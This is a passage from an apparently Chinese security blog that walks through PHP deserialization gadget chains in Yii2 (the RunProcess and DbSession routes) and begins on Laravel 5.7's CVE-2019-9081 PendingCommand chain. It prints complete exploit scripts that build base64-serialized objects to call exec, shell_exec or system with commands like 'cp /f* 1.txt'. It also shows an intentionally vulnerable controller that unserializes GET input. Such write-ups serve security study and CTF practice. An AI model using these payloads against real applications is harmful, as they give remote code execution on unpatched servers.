class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来分析 IndexAction 类，发现 run 方法可以进行RCE，而且两个参数都可控。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span> <span class="keyword">extends</span> <span class="title">Action</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;checkAccess, <span class="variable">$this</span>-&gt;id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepareDataProvider</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>对漏洞进行测试，了解yii2和用户的数据交互是由 controller 来完成的，所以需要在 controllers&#x2F;SiteControllers 中添加反序列化的接口，同时采用的是GET的穿参方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;about&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// add my test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionMytest</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;it is a test&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行命令。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231211190936475.png?imageSlim" alt="image-20231211190936475"></p>
<p>其他可用的链子：</p>
<ul>
<li><p>RunProcess 类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span> <span class="keyword">extends</span> <span class="title">Extension</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stopProcess</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">array_reverse</span>(<span class="variable">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output-&gt;<span class="title function_ invoke__">debug</span>(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;<span class="title function_ invoke__">getCommandLine</span>());</span><br><span class="line">            <span class="variable">$process</span>-&gt;<span class="title function_ invoke__">stop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /f* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">IndexAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;processes[]=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">RunProcess</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DbSession 类：</p>
<p>不过是调用了 DbSession 类的 close 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getIsActive</span>()) &#123;</span><br><span class="line">            <span class="comment">// prepare writeCallback fields before session closes</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fields = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">composeFields</span>();</span><br><span class="line">            YII_DEBUG ? <span class="title function_ invoke__">session_write_close</span>() : @<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来进入到 MultiFieldSession 类中，由于只有一个 writeCallback 变量是可控的，所以还是利用 IndexAction 类进行无参数的RCE。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">MultiFieldSession</span> <span class="keyword">extends</span> <span class="title">Session</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">composeFields</span>(<span class="params"><span class="variable">$id</span> = <span class="literal">null</span>, <span class="variable">$data</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fields</span> = <span class="variable language_">$this</span>-&gt;writeCallback ? <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;writeCallback, <span class="variable">$this</span>) : [];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$id</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$fields</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$fields</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fields</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Laravel-CVE-2019-9081"><a href="#Laravel-CVE-2019-9081" class="headerlink" title="Laravel(CVE-2019-9081)"></a>Laravel(CVE-2019-9081)</h3><p>关于 5.7 版本的漏洞复现：</p>
<blockquote>
<p><a href="https://docs.golaravel.com/docs/5.7/installation">https://docs.golaravel.com/docs/5.7/installation</a></p>
</blockquote>
<p>根据官方文档，需要添加一个反序列化入口的控制器和路由：</p>
<p>&#x2F;app&#x2F;Http&#x2F;Controllers&#x2F;MyController.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mytest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;It is a unserialize test&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x2F;routers&#x2F;web.app</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/mytest&#x27;</span>, <span class="string">&#x27;MyController@mytest&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>从exp开始分析利用链：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = [<span class="string">&#x27;ls&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>] = [<span class="string">&#x27;pursue&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] =</span><br><span class="line">                [<span class="string">&#x27;concrete&#x27;</span> =&gt; <span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcmd</span> = <span class="keyword">new</span> <span class="title class_">PendingCommand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcmd</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>入口存在于 PendingCommand 类中销毁对象的时候，能够跳到执行命令的 run 函数，重点是如何构造反序列化数据能够正常执行命令：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hasExecuted) &#123;		<span class="comment">// default false</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hasExecuted = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">mockConsoleOutput</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$exitCode</span> = <span class="variable language_">$this</span>-&gt;app[<span class="title class_">Kernel</span>::<span class="variable language_">class</span>]-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$this</span>-&gt;command, <span class="variable">$this</span>-&gt;parameters);			<span class="comment">// destination</span></span><br><span class="line"><span class="comment">// public function call($command, array $parameters = [], $outputBuffer = null);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMethodName</span>() === <span class="string">&#x27;askQuestion&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">fail</span>(<span class="string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getActualArguments</span>()[<span class="number">0</span>]-&gt;<span class="title function_ invoke__">getQuestion</span>().<span class="string">&#x27;&quot; was asked.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="variable">$e</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$mock</span> = <span class="title class_">Mockery</span>::<span class="title function_ invoke__">mock</span>(<span class="title class_">OutputStyle</span>::<span class="variable language_">class</span>.<span class="string">&#x27;[askQuestion]&#x27;</span>, [</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">ArrayInput</span>(<span class="variable">$this</span>-&gt;parameters)), <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createABufferedOutputMock</span>(),</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$question</span>) &#123;</span><br><span class="line">            <span class="variable">$mock</span>-&gt;<span class="title function_ invoke__">shouldReceive</span>(<span class="string">&#x27;askQuestion&#x27;</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">once</span>()</span><br><span class="line">                -&gt;<span class="title function_ invoke__">ordered</span>()</span><br><span class="line">                -&gt;<span class="title function_ invoke__">with</span>(<span class="title class_">Mockery</span>::<span class="title function_ invoke__">on</span>(function (<span class="variable">$argument</span>) <span class="keyword">use</span> (<span class="variable">$question</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$argument</span>-&gt;<span class="title function_ invoke__">getQuestion</span>() == <span class="variable">$question</span>[<span class="number">0</span>];</span><br><span class="line">                &#125;))</span><br><span class="line">                -&gt;<span class="title function_ invoke__">andReturnUsing</span>(function () <span class="keyword">use</span> ($<span class="title">question</span>, $<span class="title">i</span>) &#123;</span><br><span class="line">                    <span class="title">unset</span>($<span class="title">this</span>-&gt;<span class="title">test</span>-&gt;<span class="title">expectedQuestions</span>[$<span class="title">i</span>]);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$question</span>[<span class="number">1</span>];</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">bind</span>(<span class="title class_">OutputStyle</span>::<span class="variable language_">class</span>, function () <span class="keyword">use</span> ($<span class="title">mock</span>) &#123;</span><br><span class="line">            <span class="title">return</span> $<span class="title">mock</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造以下的数据包尝试能否执行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = [<span class="string">&#x27;ls&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcmd</span> = <span class="keyword">new</span> <span class="title class_">PendingCommand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcmd</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现报错，原因在 createABufferedOutputMock 方法中解析 test 成员变量时发生的错误，发现无法获取 test 中的 expectedOutput 属性，想法是对 test 构造存在 expectedOutput 属性的类，但是跟进 expectedOutput，发现是在 trait InteractsWithConsole 中定义的，也就是无法实例化。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231212195123855.png?imageSlim" alt="image-20231212195123855"></p>
<p>这时候利用到 __get 方法，寻找存在的类，找到 GenericUser 类，能够成功返回数组：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericUser</span> <span class="keyword">implements</span> <span class="title">UserContract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;attributes[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造如下数据包进行尝试：</p>
